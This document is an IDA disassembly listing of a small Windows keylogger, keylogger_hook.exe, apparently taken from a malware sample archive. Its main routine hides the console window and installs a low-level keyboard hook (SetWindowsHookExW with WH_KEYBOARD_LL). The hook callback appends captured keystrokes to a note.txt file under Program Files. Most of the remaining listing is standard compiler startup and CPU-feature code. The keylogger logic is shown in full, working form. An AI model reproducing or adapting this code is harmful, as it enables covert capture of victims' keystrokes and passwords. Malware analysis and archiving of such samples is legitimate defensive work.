.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
.text:00401000 ; |           Copyright (c) 2026 Hex-Rays, <support@hex-rays.com>           |
.text:00401000 ; |            <error retrieving user info: Invalid input data>             |
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Input SHA256 : F74483530CC72874F5D10EBAB521EA2EF47F3B319D1986B99DCF355384D35B9C
.text:00401000 ; Input MD5    : AB971710CF5EA9D60010ADE57C831B6F
.text:00401000 ; Input CRC32  : 3A315E15
.text:00401000 ; Compiler     : Visual C++ (guessed)
.text:00401000
.text:00401000 ; File Name   : /home/petik/Downloads/petikvx-archiver/Articles/UDS-Trojan-Ransom.Win32.Blocker.gen/artefacts/resources/keylogger_hook.exe
.text:00401000 ; Format      : Portable executable for 80386 (PE)
.text:00401000 ; Imagebase   : 400000
.text:00401000 ; Timestamp   : 673EBC7B (Thu Nov 21 04:52:11 2024 UTC)
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size                  : 00000EDD (   3805.)
.text:00401000 ; Section size in file          : 00001000 (   4096.)
.text:00401000 ; Offset to raw data for section: 00000400
.text:00401000 ; Flags 60000020: Text Executable Readable
.text:00401000 ; Alignment     : default
.text:00401000 ; PDB File Name : C:\Users\aaa\source\repos\keylogger_hook\Release\keylogger_hook.pdb
.text:00401000 ; OS type         :  MS Windows
.text:00401000 ; Application type:  Executable 32bit
.text:00401000
.text:00401000                 .686p
.text:00401000                 .mmx
.text:00401000                 .model flat
.text:00401000
.text:00401000 ; ===========================================================================
.text:00401000
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read/Execute
.text:00401000 _text           segment para public 'CODE' use32
.text:00401000                 assume cs:_text
.text:00401000                 ;org 401000h
.text:00401000                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:00401000
.text:00401000 ; =============== S U B R O U T I N E =======================================
.text:00401000
.text:00401000 ; Attributes: bp-based frame
.text:00401000
.text:00401000 ; LRESULT __stdcall fn(int code, WPARAM wParam, LPARAM lParam)
.text:00401000 fn              proc near               ; DATA XREF: _main+20↓o
.text:00401000
.text:00401000 nCode           = dword ptr  8
.text:00401000 wParam          = dword ptr  0Ch
.text:00401000 Buffer          = dword ptr  10h
.text:00401000
.text:00401000                 push    ebp
.text:00401001                 mov     ebp, esp
.text:00401003                 push    offset Mode     ; "a+"
.text:00401008                 push    offset FileName ; "C:\\Program Files (x86)\\note.txt"
.text:0040100D                 call    ds:fopen        ; api-ms-win-crt-stdio-l1-1-0
.text:00401013                 add     esp, 8
.text:00401016                 mov     Stream, eax
.text:0040101B                 cmp     [ebp+wParam], 100h
.text:00401022                 jnz     short loc_40103D
.text:00401024                 push    eax             ; Stream
.text:00401025                 push    [ebp+Buffer]    ; Buffer
.text:00401028                 call    ds:fputs        ; api-ms-win-crt-stdio-l1-1-0
.text:0040102E                 push    Stream          ; Stream
.text:00401034                 call    ds:fclose       ; api-ms-win-crt-stdio-l1-1-0
.text:0040103A                 add     esp, 0Ch
.text:0040103D
.text:0040103D loc_40103D:                             ; CODE XREF: fn+22↑j
.text:0040103D                 push    [ebp+Buffer]    ; lParam
.text:00401040                 push    [ebp+wParam]    ; wParam
.text:00401043                 push    [ebp+nCode]     ; nCode
.text:00401046                 push    hhk             ; hhk
.text:0040104C                 call    ds:CallNextHookEx ; USER32
.text:00401052                 pop     ebp
.text:00401053                 retn    0Ch
.text:00401053 fn              endp
.text:00401053
.text:00401053 ; ---------------------------------------------------------------------------
.text:00401056                 align 10h
.text:00401060
.text:00401060 ; =============== S U B R O U T I N E =======================================
.text:00401060
.text:00401060
.text:00401060 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:00401060 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p
.text:00401060
.text:00401060 argc            = dword ptr  4
.text:00401060 argv            = dword ptr  8
.text:00401060 envp            = dword ptr  0Ch
.text:00401060
.text:00401060                 call    ds:AllocConsole ; KERNEL32
.text:00401066                 push    0               ; lpWindowName
.text:00401068                 push    offset ClassName ; "ConsoleWindowClass"
.text:0040106D                 call    ds:FindWindowA  ; USER32
.text:00401073                 push    0               ; nCmdShow
.text:00401075                 push    eax             ; hWnd
.text:00401076                 call    ds:ShowWindow   ; USER32
.text:0040107C                 push    0               ; dwThreadId
.text:0040107E                 push    0               ; hmod
.text:00401080                 push    offset fn       ; lpfn
.text:00401085                 push    0Dh             ; idHook
.text:00401087                 call    ds:SetWindowsHookExW ; USER32
.text:0040108D                 mov     hhk, eax
.text:00401092                 test    eax, eax
.text:00401094                 jz      short loc_40109D
.text:00401096                 push    offset aAllIsGood ; "All is good"
.text:0040109B                 jmp     short loc_4010A2
.text:0040109D ; ---------------------------------------------------------------------------
.text:0040109D
.text:0040109D loc_40109D:                             ; CODE XREF: _main+34↑j
.text:0040109D                 push    offset Buffer   ; "Something went wrong :("
.text:004010A2
.text:004010A2 loc_4010A2:                             ; CODE XREF: _main+3B↑j
.text:004010A2                 call    ds:puts         ; api-ms-win-crt-stdio-l1-1-0
.text:004010A8                 add     esp, 4
.text:004010AB                 push    esi
.text:004010AC                 mov     esi, ds:GetMessageW ; USER32
.text:004010B2                 push    0               ; wMsgFilterMax
.text:004010B4                 push    0               ; wMsgFilterMin
.text:004010B6                 push    0               ; hWnd
.text:004010B8                 push    lpMsg           ; lpMsg
.text:004010BE                 call    esi ; GetMessageW ; USER32
.text:004010C0                 test    eax, eax
.text:004010C2                 jle     short loc_4010F6
.text:004010C4                 push    ebx
.text:004010C5                 mov     ebx, ds:DispatchMessageW ; USER32
.text:004010CB                 push    edi
.text:004010CC                 mov     edi, ds:TranslateMessage ; USER32
.text:004010D2
.text:004010D2 loc_4010D2:                             ; CODE XREF: _main+92↓j
.text:004010D2                 push    lpMsg           ; lpMsg
.text:004010D8                 call    edi ; TranslateMessage ; USER32
.text:004010DA                 push    lpMsg           ; lpMsg
.text:004010E0                 call    ebx ; DispatchMessageW ; USER32
.text:004010E2                 push    0               ; wMsgFilterMax
.text:004010E4                 push    0               ; wMsgFilterMin
.text:004010E6                 push    0               ; hWnd
.text:004010E8                 push    lpMsg           ; lpMsg
.text:004010EE                 call    esi ; GetMessageW ; USER32
.text:004010F0                 test    eax, eax
.text:004010F2                 jg      short loc_4010D2
.text:004010F4                 pop     edi
.text:004010F5                 pop     ebx
.text:004010F6
.text:004010F6 loc_4010F6:                             ; CODE XREF: _main+62↑j
.text:004010F6                 xor     eax, eax
.text:004010F8                 pop     esi
.text:004010F9                 retn
.text:004010F9 _main           endp
.text:004010F9
.text:004010FA ; [0000000E BYTES: COLLAPSED FUNCTION __security_check_cookie(x)]
.text:00401108 ; [000000AB BYTES: COLLAPSED FUNCTION pre_c_initialization(void)]
.text:004011B3
.text:004011B3 ; =============== S U B R O U T I N E =======================================
.text:004011B3
.text:004011B3
.text:004011B3 sub_4011B3      proc near               ; DATA XREF: .rdata:0040210C↓o
.text:004011B3                 call    ___scrt_initialize_default_local_stdio_options
.text:004011B8                 xor     eax, eax
.text:004011BA                 retn
.text:004011BA sub_4011B3      endp
.text:004011BA
.text:004011BB
.text:004011BB ; =============== S U B R O U T I N E =======================================
.text:004011BB
.text:004011BB
.text:004011BB sub_4011BB      proc near               ; DATA XREF: .rdata:004020FC↓o
.text:004011BB                 call    sub_401942
.text:004011C0                 call    UserMathErrorFunction
.text:004011C5                 push    eax             ; NewMode
.text:004011C6                 call    _set_new_mode
.text:004011CB                 pop     ecx
.text:004011CC                 retn
.text:004011CC sub_4011BB      endp
.text:004011CC
.text:004011CD ; [00000182 BYTES: COLLAPSED FUNCTION __scrt_common_main_seh(void)]
.text:0040134F ; [0000000A BYTES: COLLAPSED FUNCTION start]
.text:00401359 ; [00000028 BYTES: COLLAPSED FUNCTION ___raise_securityfailure]
.text:00401381 ; [000000FB BYTES: COLLAPSED FUNCTION ___report_gsfailure]
.text:0040147C ; [00000044 BYTES: COLLAPSED FUNCTION find_pe_section(uchar * const,uint)]
.text:004014C0 ; [00000032 BYTES: COLLAPSED FUNCTION ___scrt_acquire_startup_lock]
.text:004014F2 ; [00000039 BYTES: COLLAPSED FUNCTION ___scrt_initialize_crt]
.text:0040152B ; [00000087 BYTES: COLLAPSED FUNCTION ___scrt_initialize_onexit_tables]
.text:004015B2 ; [00000094 BYTES: COLLAPSED FUNCTION ___scrt_is_nonwritable_in_current_image]
.text:00401646 ; [0000001D BYTES: COLLAPSED FUNCTION ___scrt_release_startup_lock]
.text:00401663 ; [00000028 BYTES: COLLAPSED FUNCTION ___scrt_uninitialize_crt]
.text:0040168B ; [0000002D BYTES: COLLAPSED FUNCTION __onexit]
.text:004016B8 ; [00000015 BYTES: COLLAPSED FUNCTION _atexit]
.text:004016CD ; [0000004D BYTES: COLLAPSED FUNCTION ___get_entropy]
.text:0040171A ; [0000004B BYTES: COLLAPSED FUNCTION ___security_init_cookie]
.text:00401765
.text:00401765 ; =============== S U B R O U T I N E =======================================
.text:00401765
.text:00401765
.text:00401765 ; int __cdecl UserMathErrorFunction(struct _exception *)
.text:00401765 UserMathErrorFunction proc near         ; CODE XREF: pre_c_initialization(void)+13↑p
.text:00401765                                         ; pre_c_initialization(void)+7A↑p ...
.text:00401765                 xor     eax, eax
.text:00401767                 retn
.text:00401767 UserMathErrorFunction endp
.text:00401767
.text:00401768
.text:00401768 ; =============== S U B R O U T I N E =======================================
.text:00401768
.text:00401768
.text:00401768 sub_401768      proc near               ; CODE XREF: pre_c_initialization(void)+41↑p
.text:00401768                 xor     eax, eax
.text:0040176A                 inc     eax
.text:0040176B                 retn
.text:0040176B sub_401768      endp
.text:0040176B
.text:0040176C ; [00000006 BYTES: COLLAPSED FUNCTION __get_startup_file_mode]
.text:00401772
.text:00401772 ; =============== S U B R O U T I N E =======================================
.text:00401772
.text:00401772
.text:00401772 sub_401772      proc near               ; CODE XREF: pre_c_initialization(void)+52↑p
.text:00401772                 push    offset ListHead ; ListHead
.text:00401777                 call    ds:InitializeSListHead ; KERNEL32
.text:0040177D                 retn
.text:0040177D sub_401772      endp
.text:0040177D
.text:0040177E
.text:0040177E ; =============== S U B R O U T I N E =======================================
.text:0040177E
.text:0040177E
.text:0040177E sub_40177E      proc near               ; CODE XREF: pre_c_initialization(void)+86↑p
.text:0040177E                                         ; ___scrt_initialize_crt+15↑p ...
.text:0040177E                 mov     al, 1
.text:00401780                 retn
.text:00401780 sub_40177E      endp
.text:00401780
.text:00401781 ; [00000021 BYTES: COLLAPSED FUNCTION __initialize_default_precision]
.text:004017A2 ; [00000003 BYTES: COLLAPSED FUNCTION nullsub_1]
.text:004017A5
.text:004017A5 ; =============== S U B R O U T I N E =======================================
.text:004017A5
.text:004017A5
.text:004017A5 sub_4017A5      proc near               ; CODE XREF: ___scrt_initialize_default_local_stdio_options↓p
.text:004017A5                 mov     eax, offset unk_4033A8
.text:004017AA                 retn
.text:004017AA sub_4017A5      endp
.text:004017AA
.text:004017AB
.text:004017AB ; =============== S U B R O U T I N E =======================================
.text:004017AB
.text:004017AB
.text:004017AB sub_4017AB      proc near               ; CODE XREF: ___scrt_initialize_default_local_stdio_options+E↓p
.text:004017AB                 mov     eax, offset unk_4033B0
.text:004017B0                 retn
.text:004017B0 sub_4017AB      endp
.text:004017B0
.text:004017B1 ; [0000001D BYTES: COLLAPSED FUNCTION ___scrt_initialize_default_local_stdio_options]
.text:004017CE
.text:004017CE ; =============== S U B R O U T I N E =======================================
.text:004017CE
.text:004017CE
.text:004017CE sub_4017CE      proc near               ; CODE XREF: pre_c_initialization(void)+57↑p
.text:004017CE                 xor     eax, eax
.text:004017D0                 cmp     dword_403048, eax
.text:004017D6                 setz    al
.text:004017D9                 retn
.text:004017D9 sub_4017CE      endp
.text:004017D9
.text:004017DA
.text:004017DA ; =============== S U B R O U T I N E =======================================
.text:004017DA
.text:004017DA
.text:004017DA sub_4017DA      proc near               ; CODE XREF: __scrt_common_main_seh(void)+98↑p
.text:004017DA                 mov     eax, offset unk_4033CC
.text:004017DF                 retn
.text:004017DF sub_4017DA      endp
.text:004017DF
.text:004017E0
.text:004017E0 ; =============== S U B R O U T I N E =======================================
.text:004017E0
.text:004017E0
.text:004017E0 sub_4017E0      proc near               ; CODE XREF: __scrt_common_main_seh(void):loc_40128D↑p
.text:004017E0                 mov     eax, offset unk_4033C8
.text:004017E5                 retn
.text:004017E5 sub_4017E0      endp
.text:004017E5
.text:004017E6 ; [00000115 BYTES: COLLAPSED FUNCTION ___scrt_fastfail]
.text:004018FB ; [00000005 BYTES: COLLAPSED FUNCTION j_UserMathErrorFunction]
.text:00401900 ; [00000042 BYTES: COLLAPSED FUNCTION ___scrt_is_managed_app]
.text:00401942
.text:00401942 ; =============== S U B R O U T I N E =======================================
.text:00401942
.text:00401942
.text:00401942 sub_401942      proc near               ; CODE XREF: sub_4011BB↑p
.text:00401942                 push    offset ___scrt_unhandled_exception_filter@4 ; lpTopLevelExceptionFilter
.text:00401947                 call    ds:SetUnhandledExceptionFilter ; KERNEL32
.text:0040194D                 retn
.text:0040194D sub_401942      endp
.text:0040194D
.text:0040194E ; [00000055 BYTES: COLLAPSED FUNCTION __scrt_unhandled_exception_filter(x)]
.text:004019A3                 align 4
.text:004019A4
.text:004019A4 ; =============== S U B R O U T I N E =======================================
.text:004019A4
.text:004019A4
.text:004019A4 sub_4019A4      proc near               ; CODE XREF: ___scrt_fastfail+1D↑p
.text:004019A4                                         ; ___scrt_fastfail+10C↑p
.text:004019A4                 and     dword_4033B8, 0
.text:004019AB                 retn
.text:004019AB sub_4019A4      endp
.text:004019AB
.text:004019AC
.text:004019AC ; =============== S U B R O U T I N E =======================================
.text:004019AC
.text:004019AC
.text:004019AC sub_4019AC      proc near               ; CODE XREF: pre_c_initialization(void)+32↑p
.text:004019AC                 push    ebx
.text:004019AD                 push    esi
.text:004019AE                 mov     esi, offset unk_402610
.text:004019B3                 mov     ebx, offset unk_402610
.text:004019B8                 cmp     esi, ebx
.text:004019BA                 jnb     short loc_4019D5
.text:004019BC                 push    edi
.text:004019BD
.text:004019BD loc_4019BD:                             ; CODE XREF: sub_4019AC+26↓j
.text:004019BD                 mov     edi, [esi]
.text:004019BF                 test    edi, edi
.text:004019C1                 jz      short loc_4019CD
.text:004019C3                 mov     ecx, edi
.text:004019C5                 call    ds:___guard_check_icall_fptr
.text:004019CB                 call    edi
.text:004019CD
.text:004019CD loc_4019CD:                             ; CODE XREF: sub_4019AC+15↑j
.text:004019CD                 add     esi, 4
.text:004019D0                 cmp     esi, ebx
.text:004019D2                 jb      short loc_4019BD
.text:004019D4                 pop     edi
.text:004019D5
.text:004019D5 loc_4019D5:                             ; CODE XREF: sub_4019AC+E↑j
.text:004019D5                 pop     esi
.text:004019D6                 pop     ebx
.text:004019D7                 retn
.text:004019D7 sub_4019AC      endp
.text:004019D7
.text:004019D8
.text:004019D8 ; =============== S U B R O U T I N E =======================================
.text:004019D8
.text:004019D8
.text:004019D8 ; void __cdecl sub_4019D8()
.text:004019D8 sub_4019D8      proc near               ; DATA XREF: pre_c_initialization(void)+37↑o
.text:004019D8                 push    ebx
.text:004019D9                 push    esi
.text:004019DA                 mov     esi, offset unk_402618
.text:004019DF                 mov     ebx, offset unk_402618
.text:004019E4                 cmp     esi, ebx
.text:004019E6                 jnb     short loc_401A01
.text:004019E8                 push    edi
.text:004019E9
.text:004019E9 loc_4019E9:                             ; CODE XREF: sub_4019D8+26↓j
.text:004019E9                 mov     edi, [esi]
.text:004019EB                 test    edi, edi
.text:004019ED                 jz      short loc_4019F9
.text:004019EF                 mov     ecx, edi
.text:004019F1                 call    ds:___guard_check_icall_fptr
.text:004019F7                 call    edi
.text:004019F9
.text:004019F9 loc_4019F9:                             ; CODE XREF: sub_4019D8+15↑j
.text:004019F9                 add     esi, 4
.text:004019FC                 cmp     esi, ebx
.text:004019FE                 jb      short loc_4019E9
.text:00401A00                 pop     edi
.text:00401A01
.text:00401A01 loc_401A01:                             ; CODE XREF: sub_4019D8+E↑j
.text:00401A01                 pop     esi
.text:00401A02                 pop     ebx
.text:00401A03                 retn
.text:00401A03 sub_4019D8      endp
.text:00401A03
.text:00401A03 ; ---------------------------------------------------------------------------
.text:00401A04                 align 10h
.text:00401A10 ; [00000045 BYTES: COLLAPSED FUNCTION __SEH_prolog4]
.text:00401A55 ; [0000002F BYTES: COLLAPSED FUNCTION __except_handler4]
.text:00401A84
.text:00401A84 ; =============== S U B R O U T I N E =======================================
.text:00401A84
.text:00401A84 ; Attributes: bp-based frame
.text:00401A84
.text:00401A84 sub_401A84      proc near               ; CODE XREF: ___scrt_initialize_crt:loc_401502↑p
.text:00401A84
.text:00401A84 var_28          = dword ptr -28h
.text:00401A84 var_24          = dword ptr -24h
.text:00401A84 var_20          = dword ptr -20h
.text:00401A84 var_1C          = dword ptr -1Ch
.text:00401A84 var_18          = dword ptr -18h
.text:00401A84 var_14          = dword ptr -14h
.text:00401A84 var_10          = dword ptr -10h
.text:00401A84 var_C           = dword ptr -0Ch
.text:00401A84 var_8           = dword ptr -8
.text:00401A84 var_4           = dword ptr -4
.text:00401A84
.text:00401A84                 push    ebp
.text:00401A85                 mov     ebp, esp
.text:00401A87                 and     dword_4033C0, 0
.text:00401A8E                 sub     esp, 28h
.text:00401A91                 or      dword_403058, 1
.text:00401A98                 push    0Ah             ; ProcessorFeature
.text:00401A9A                 call    ds:IsProcessorFeaturePresent ; KERNEL32
.text:00401AA0                 test    eax, eax
.text:00401AA2                 jz      loc_401DAD
.text:00401AA8                 push    ebx
.text:00401AA9                 push    esi
.text:00401AAA                 push    edi
.text:00401AAB                 xor     eax, eax
.text:00401AAD                 lea     edi, [ebp+var_28]
.text:00401AB0                 xor     ecx, ecx
.text:00401AB2                 push    ebx
.text:00401AB3                 cpuid
.text:00401AB5                 mov     esi, ebx
.text:00401AB7                 pop     ebx
.text:00401AB8                 nop
.text:00401AB9                 mov     [edi], eax
.text:00401ABB                 mov     [edi+4], esi
.text:00401ABE                 mov     [edi+8], ecx
.text:00401AC1                 xor     ecx, ecx
.text:00401AC3                 mov     [edi+0Ch], edx
.text:00401AC6                 mov     eax, [ebp+var_28]
.text:00401AC9                 mov     edi, [ebp+var_24]
.text:00401ACC                 mov     [ebp+var_4], eax
.text:00401ACF                 xor     edi, 756E6547h
.text:00401AD5                 mov     eax, [ebp+var_1C]
.text:00401AD8                 xor     eax, 49656E69h
.text:00401ADD                 mov     [ebp+var_18], eax
.text:00401AE0                 mov     eax, [ebp+var_20]
.text:00401AE3                 xor     eax, 6C65746Eh
.text:00401AE8                 mov     [ebp+var_14], eax
.text:00401AEB                 xor     eax, eax
.text:00401AED                 inc     eax
.text:00401AEE                 push    ebx
.text:00401AEF                 cpuid
.text:00401AF1                 mov     esi, ebx
.text:00401AF3                 pop     ebx
.text:00401AF4                 nop
.text:00401AF5                 lea     ebx, [ebp+var_28]
.text:00401AF8                 mov     [ebx], eax
.text:00401AFA                 mov     eax, [ebp+var_18]
.text:00401AFD                 or      eax, [ebp+var_14]
.text:00401B00                 or      eax, edi
.text:00401B02                 mov     [ebx+4], esi
.text:00401B05                 mov     [ebx+8], ecx
.text:00401B08                 mov     [ebx+0Ch], edx
.text:00401B0B                 jnz     short loc_401B46
.text:00401B0D                 mov     eax, [ebp+var_28]
.text:00401B10                 and     eax, 0FFF3FF0h
.text:00401B15                 cmp     eax, 106C0h
.text:00401B1A                 jz      short loc_401B3F
.text:00401B1C                 cmp     eax, 20660h
.text:00401B21                 jz      short loc_401B3F
.text:00401B23                 cmp     eax, 20670h
.text:00401B28                 jz      short loc_401B3F
.text:00401B2A                 cmp     eax, 30650h
.text:00401B2F                 jz      short loc_401B3F
.text:00401B31                 cmp     eax, 30660h
.text:00401B36                 jz      short loc_401B3F
.text:00401B38                 cmp     eax, 30670h
.text:00401B3D                 jnz     short loc_401B46
.text:00401B3F
.text:00401B3F loc_401B3F:                             ; CODE XREF: sub_401A84+96↑j
.text:00401B3F                                         ; sub_401A84+9D↑j ...
.text:00401B3F                 or      dword_4033C4, 1
.text:00401B46
.text:00401B46 loc_401B46:                             ; CODE XREF: sub_401A84+87↑j
.text:00401B46                                         ; sub_401A84+B9↑j
.text:00401B46                 mov     edx, [ebp+var_20]
.text:00401B49                 xor     ebx, ebx
.text:00401B4B                 and     [ebp+var_14], ebx
.text:00401B4E                 xor     edi, edi
.text:00401B50                 and     [ebp+var_18], ebx
.text:00401B53                 cmp     [ebp+var_4], 7
.text:00401B57                 mov     [ebp+var_C], edx
.text:00401B5A                 jl      loc_401BE7
.text:00401B60                 push    7
.text:00401B62                 pop     eax
.text:00401B63                 xor     ecx, ecx
.text:00401B65                 push    ebx
.text:00401B66                 cpuid
.text:00401B68                 mov     esi, ebx
.text:00401B6A                 pop     ebx
.text:00401B6B                 nop
.text:00401B6C                 lea     ebx, [ebp+var_28]
.text:00401B6F                 mov     [ebx], eax
.text:00401B71                 mov     [ebx+4], esi
.text:00401B74                 mov     [ebx+8], ecx
.text:00401B77                 mov     [ebx+0Ch], edx
.text:00401B7A                 mov     ebx, [ebp+var_24]
.text:00401B7D                 mov     eax, [ebp+var_1C]
.text:00401B80                 mov     [ebp+var_8], ebx
.text:00401B83                 mov     [ebp+var_14], eax
.text:00401B86                 test    ebx, 200h
.text:00401B8C                 jz      short loc_401B95
.text:00401B8E                 or      dword_4033C4, 2
.text:00401B95
.text:00401B95 loc_401B95:                             ; CODE XREF: sub_401A84+108↑j
.text:00401B95                 cmp     [ebp+var_28], 1
.text:00401B99                 jl      short loc_401BBF
.text:00401B9B                 push    7
.text:00401B9D                 pop     eax
.text:00401B9E                 xor     ecx, ecx
.text:00401BA0                 inc     ecx
.text:00401BA1                 push    ebx
.text:00401BA2                 cpuid
.text:00401BA4                 mov     esi, ebx
.text:00401BA6                 pop     ebx
.text:00401BA7                 nop
.text:00401BA8                 lea     ebx, [ebp+var_28]
.text:00401BAB                 mov     [ebx], eax
.text:00401BAD                 mov     [ebx+4], esi
.text:00401BB0                 mov     [ebx+8], ecx
.text:00401BB3                 mov     [ebx+0Ch], edx
.text:00401BB6                 mov     eax, [ebp+var_1C]
.text:00401BB9                 mov     ebx, [ebp+var_8]
.text:00401BBC                 mov     [ebp+var_18], eax
.text:00401BBF
.text:00401BBF loc_401BBF:                             ; CODE XREF: sub_401A84+115↑j
.text:00401BBF                 push    24h ; '$'
.text:00401BC1                 pop     eax
.text:00401BC2                 cmp     [ebp+var_4], eax
.text:00401BC5                 jl      short loc_401BE4
.text:00401BC7                 xor     ecx, ecx
.text:00401BC9                 lea     edi, [ebp+var_28]
.text:00401BCC                 push    ebx
.text:00401BCD                 cpuid
.text:00401BCF                 mov     esi, ebx
.text:00401BD1                 pop     ebx
.text:00401BD2                 nop
.text:00401BD3                 mov     ebx, [ebp+var_8]
.text:00401BD6                 mov     [edi], eax
.text:00401BD8                 mov     [edi+4], esi
.text:00401BDB                 mov     [edi+8], ecx
.text:00401BDE                 mov     [edi+0Ch], edx
.text:00401BE1                 mov     edi, [ebp+var_24]
.text:00401BE4
.text:00401BE4 loc_401BE4:                             ; CODE XREF: sub_401A84+141↑j
.text:00401BE4                 mov     edx, [ebp+var_C]
.text:00401BE7
.text:00401BE7 loc_401BE7:                             ; CODE XREF: sub_401A84+D6↑j
.text:00401BE7                 mov     eax, dword_403058
.text:00401BEC                 mov     ecx, dword_403050
.text:00401BF2                 or      eax, 2
.text:00401BF5                 mov     esi, dword_403054
.text:00401BFB                 and     ecx, 0FFFFFFFEh
.text:00401BFE                 mov     dword_4033C0, 1
.text:00401C08                 mov     dword_403058, eax
.text:00401C0D                 mov     dword_403050, ecx
.text:00401C13                 mov     dword_403054, esi
.text:00401C19                 test    edx, 100000h
.text:00401C1F                 jz      loc_401DAA
.text:00401C25                 or      eax, 4
.text:00401C28                 mov     dword_4033C0, 2
.text:00401C32                 and     ecx, 0FFFFFFEFh
.text:00401C35                 mov     dword_403058, eax
.text:00401C3A                 mov     dword_403050, ecx
.text:00401C40                 mov     dword_403054, esi
.text:00401C46                 test    edx, 8000000h
.text:00401C4C                 jz      loc_401DAA
.text:00401C52                 test    edx, 10000000h
.text:00401C58                 jz      loc_401DAA
.text:00401C5E                 xor     ecx, ecx
.text:00401C60                 xgetbv
.text:00401C63                 mov     [ebp+var_10], eax
.text:00401C66                 xor     esi, esi
.text:00401C68                 mov     [ebp+var_C], edx
.text:00401C6B                 mov     eax, [ebp+var_10]
.text:00401C6E                 mov     ecx, [ebp+var_C]
.text:00401C71                 and     eax, 6
.text:00401C74                 and     ecx, esi
.text:00401C76                 cmp     eax, 6
.text:00401C79                 jnz     loc_401DAA
.text:00401C7F                 cmp     ecx, esi
.text:00401C81                 jnz     loc_401DAA
.text:00401C87                 mov     eax, dword_403058
.text:00401C8C                 or      eax, 8
.text:00401C8F                 mov     dword_4033C0, 3
.text:00401C99                 mov     dword_403058, eax
.text:00401C9E                 test    bl, 20h
.text:00401CA1                 jz      short loc_401D1C
.text:00401CA3                 mov     ecx, dword_403054
.text:00401CA9                 or      eax, 20h
.text:00401CAC                 mov     dword_403058, eax
.text:00401CB1                 mov     edx, 0D0030000h
.text:00401CB6                 mov     eax, dword_403050
.text:00401CBB                 and     ebx, edx
.text:00401CBD                 and     eax, 0FFFFFFFDh
.text:00401CC0                 mov     dword_4033C0, 5
.text:00401CCA                 mov     dword_403050, eax
.text:00401CCF                 mov     dword_403054, ecx
.text:00401CD5                 cmp     ebx, edx
.text:00401CD7                 jnz     short loc_401D27
.text:00401CD9                 mov     eax, [ebp+var_10]
.text:00401CDC                 mov     edx, 0E0h
.text:00401CE1                 mov     ecx, [ebp+var_C]
.text:00401CE4                 and     eax, edx
.text:00401CE6                 and     ecx, esi
.text:00401CE8                 cmp     eax, edx
.text:00401CEA                 jnz     short loc_401D1C
.text:00401CEC                 cmp     ecx, esi
.text:00401CEE                 jnz     short loc_401D1C
.text:00401CF0                 mov     eax, dword_403050
.text:00401CF5                 or      dword_403058, 40h
.text:00401CFC                 and     eax, 0FFFFFFDBh
.text:00401CFF                 mov     ecx, dword_403054
.text:00401D05                 mov     dword_4033C0, 6
.text:00401D0F                 mov     dword_403050, eax
.text:00401D14                 mov     dword_403054, ecx
.text:00401D1A                 jmp     short loc_401D27
.text:00401D1C ; ---------------------------------------------------------------------------
.text:00401D1C
.text:00401D1C loc_401D1C:                             ; CODE XREF: sub_401A84+21D↑j
.text:00401D1C                                         ; sub_401A84+266↑j ...
.text:00401D1C                 mov     ecx, dword_403054
.text:00401D22                 mov     eax, dword_403050
.text:00401D27
.text:00401D27 loc_401D27:                             ; CODE XREF: sub_401A84+253↑j
.text:00401D27                                         ; sub_401A84+296↑j
.text:00401D27                 test    [ebp+var_14], 800000h
.text:00401D2E                 jz      short loc_401D40
.text:00401D30                 and     eax, 0FEFFFFFFh
.text:00401D35                 mov     dword_403054, ecx
.text:00401D3B                 mov     dword_403050, eax
.text:00401D40
.text:00401D40 loc_401D40:                             ; CODE XREF: sub_401A84+2AA↑j
.text:00401D40                 test    [ebp+var_18], 80000h
.text:00401D47                 jz      short loc_401DAA
.text:00401D49                 mov     eax, [ebp+var_10]
.text:00401D4C                 mov     edx, 0E0h
.text:00401D51                 mov     ecx, [ebp+var_C]
.text:00401D54                 and     eax, edx
.text:00401D56                 and     ecx, esi
.text:00401D58                 cmp     eax, edx
.text:00401D5A                 jnz     short loc_401DAA
.text:00401D5C                 cmp     ecx, esi
.text:00401D5E                 jnz     short loc_401DAA
.text:00401D60                 mov     eax, edi
.text:00401D62                 xor     ecx, ecx
.text:00401D64                 shr     edi, 10h
.text:00401D67                 and     eax, 400FFh
.text:00401D6C                 and     edi, 7
.text:00401D6F                 mov     dword_4033BC, eax
.text:00401D74                 or      edi, 1000028h
.text:00401D7A                 not     ecx
.text:00401D7C                 and     ecx, dword_403054
.text:00401D82                 not     edi
.text:00401D84                 and     edi, dword_403050
.text:00401D8A                 mov     dword_403050, edi
.text:00401D90                 mov     dword_403054, ecx
.text:00401D96                 cmp     eax, 1
.text:00401D99                 jbe     short loc_401DAA
.text:00401D9B                 and     edi, 0FFFFFFBFh
.text:00401D9E                 mov     dword_403054, ecx
.text:00401DA4                 mov     dword_403050, edi
.text:00401DAA
.text:00401DAA loc_401DAA:                             ; CODE XREF: sub_401A84+19B↑j
.text:00401DAA                                         ; sub_401A84+1C8↑j ...
.text:00401DAA                 pop     edi
.text:00401DAB                 pop     esi
.text:00401DAC                 pop     ebx
.text:00401DAD
.text:00401DAD loc_401DAD:                             ; CODE XREF: sub_401A84+1E↑j
.text:00401DAD                 xor     eax, eax
.text:00401DAF                 leave
.text:00401DB0                 retn
.text:00401DB0 sub_401A84      endp
.text:00401DB0
.text:00401DB1 ; [0000000C BYTES: COLLAPSED FUNCTION ___scrt_is_ucrt_dll_in_use]
.text:00401DBD ; [00000006 BYTES: COLLAPSED FUNCTION __current_exception]
.text:00401DC3 ; [00000006 BYTES: COLLAPSED FUNCTION __current_exception_context]
.text:00401DC9 ; [00000006 BYTES: COLLAPSED FUNCTION memset]
.text:00401DCF ; [00000006 BYTES: COLLAPSED FUNCTION _except_handler4_common]
.text:00401DD5 ; [00000006 BYTES: COLLAPSED FUNCTION _seh_filter_exe]
.text:00401DDB ; [00000006 BYTES: COLLAPSED FUNCTION _set_app_type]
.text:00401DE1 ; [00000006 BYTES: COLLAPSED FUNCTION __setusermatherr]
.text:00401DE7 ; [00000006 BYTES: COLLAPSED FUNCTION _configure_narrow_argv]
.text:00401DED ; [00000006 BYTES: COLLAPSED FUNCTION _initialize_narrow_environment]
